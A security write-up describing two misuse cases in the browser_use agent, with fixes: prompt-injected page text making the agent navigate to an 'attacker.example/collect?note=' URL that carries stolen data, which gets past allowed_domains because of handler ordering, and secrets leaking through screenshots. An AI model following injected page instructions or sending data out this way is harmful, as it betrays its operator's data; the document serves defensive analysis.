# Two Fully-Dressed Misuse Cases

Both are behaviours I reproduced on my own machine against local or public test endpoints. The
published CVE is covered separately under the security bug history.

## Misuse Case 1: Exfiltrate Data in a Blocked URL

**Attacker.** The operator of a host that is *not* on the agent's allowed-domain list, who can get
text onto a page the agent reads. They want data out of the agent's session, and confirmation that
an automated client exists at that address.

**Preconditions.**

- The agent runs with `allowed_domains` configured, so its operator believes navigation is confined.
- The agent reads page content and chooses its next action from it, so page text is untrusted input.
- The attacker controls a host that records incoming requests.

**Attack scenario.**

1. The attacker places an instruction and a link on a page the agent will visit, with the data to
   steal in the query string: `https://attacker.example/collect?note=<value the agent holds>`.
2. The model reads that page text as part of its state and emits a `navigate` action for the URL.
3. `Tools.navigate` dispatches `NavigateToUrlEvent` with no check of its own
   (`browser_use/tools/service.py:510`).
4. `BrowserSession.on_NavigateToUrlEvent` (`browser_use/browser/session.py:907`) handles it first
   and tells Chrome to open the page. It is first because the session registers its own handlers at
   construction (`session.py:718`) while the watchdogs only attach later (`session.py:798`).
5. Chrome opens a connection to the attacker's host and sends the full URL. The attacker's log now
   holds the path, the query string, the client IP and the request headers.
6. `SecurityWatchdog.on_NavigateToUrlEvent`
   (`browser_use/browser/watchdogs/security_watchdog.py:35`) now runs, finds the host is not
   allowed, dispatches a `BrowserErrorEvent` and raises.
7. `SecurityWatchdog.on_NavigationCompleteEvent` (line 50) switches the tab to `about:blank`. The
   agent receives an error result and carries on with the task.

**Intervention points.**

- **Step 3.** `Tools.navigate` could consult the policy before dispatching. Cheap, but it copies
  security policy into the action layer, where it would then have to be repeated for `search`,
  `go_back` and every other navigating action.
- **Step 4, the right place.** Either register `SecurityWatchdog`'s handler ahead of the session's,
  or have `BrowserSession.on_NavigateToUrlEvent` consult the policy before issuing the CDP command.
  The ordering is the defect; the check itself already exists and works.
- **Step 5, the strongest.** Enforce at the CDP layer with request interception, so no request
  leaves without a decision. This also covers redirects and subresource requests, which the
  URL-level check never sees.
- **Step 7 is cleanup, not prevention.** Switching to `about:blank` limits what the agent *sees*; it
  cannot recall a request that has already been sent.

**Consequence.** The attacker gains whatever was encoded in the URL, plus the agent's IP address and
headers, and confirmation that an agent is running. The operator loses the guarantee they believed
`allowed_domains` provided: the control stops the agent from *reading* the response, not from
*sending* the request. Reproduced locally with `allowed_domains=['example.com']`, where the
after-load handler logged the block, which it can only do if the page actually loaded.

## Misuse Case 2: Read a Secret From the Screenshot

**Attacker.** Anyone who receives the agent's screenshots or its stored run artifacts: the
third-party model provider, or a person with access to the saved conversation files on the machine.
They want the value that `sensitive_data` was supposed to keep out of the model's view.

**Preconditions.**

- The developer passes a secret through `sensitive_data` and refers to it in the task as
  `<secret>name</secret>`, believing the real value never reaches the model.
- `use_vision` is on, which is the default.
- The page displays the value once entered, which is normal for forms, confirmation pages and
  prefilled fields.

**Attack scenario.**

1. The developer supplies the secret via `sensitive_data` and writes the placeholder in the task.
2. `MessageManager._filter_sensitive_data`
   (`browser_use/agent/message_manager/service.py:577`) replaces the real value in message text, so
   the text channel is genuinely clean.
3. At execution time the registry substitutes the real value
   (`browser_use/tools/registry/service.py:442`) and the agent types it into the form.
4. The page now shows the value. The next step captures a screenshot, which nothing redacts.
5. The screenshot goes to the model provider with the next request.
6. The model reads the value off the image and repeats it in its own reasoning and in its final
   answer.
7. The value is written to disk in the saved conversation file and returned by `final_result()`.

**Intervention points.**

- **Step 4, the cheapest real fix.** Do not attach screenshots while `sensitive_data` is configured,
  unless the developer explicitly opts in. The Agent already owns this decision, since it is the
  component that decides `use_vision` at startup.
- **Step 4, the complete fix.** Redact the screenshot regions that contain secret values.
  `DOMWatchdog` knows each element's bounds, so the information needed exists, but this is
  considerably more work and fails open if the bounds are wrong.
- **Steps 6 and 7.** Apply the same redaction to model *output* and to stored artifacts, not only to
  input messages. Today the filter is one-directional, which is why the value reached the
  conversation file and the final answer.

**Consequence.** The secret reaches a third-party provider and is persisted on disk in the run
artifacts, defeating the single promise the `sensitive_data` feature makes. Reproduced locally
against `httpbin.org/forms/post`: with screenshots on, one of three saved conversation files
contained the real address and the final answer repeated it; with `use_vision=False`, no file
contained it.
